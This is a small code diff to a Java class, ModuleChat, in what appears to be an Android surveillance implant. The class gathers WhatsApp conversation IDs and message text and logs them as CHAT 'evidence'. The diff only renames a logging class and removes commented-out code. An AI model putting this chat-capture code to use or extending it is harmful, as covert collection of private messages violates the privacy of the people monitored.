@@ -21,7 +21,7 @@ import com.android.networking.db.GenericSqliteHelper;
 import com.android.networking.evidence.EvDispatcher;
 
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerProcess;
@@ -260,12 +260,10 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			// f.9=@s.whatsapp.net	
 			items.add(WChar.getBytes(conversation.replaceAll(Messages.getString("f.9"), ""), true));
 			items.add(WChar.getBytes(message, true));
-			items.add(ByteArray.intToByteArray(LogR.E_DELIMITER));
+			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
 		}
 
-		LogR.atomic(EvidenceType.CHAT, items);
-		/*Evidence evidence = new Evidence(EvidenceType.CHAT);
-		evidence.atomicWriteOnce(items);*/
+		EvidenceReference.atomic(EvidenceType.CHAT, items);
 	}
 
 }
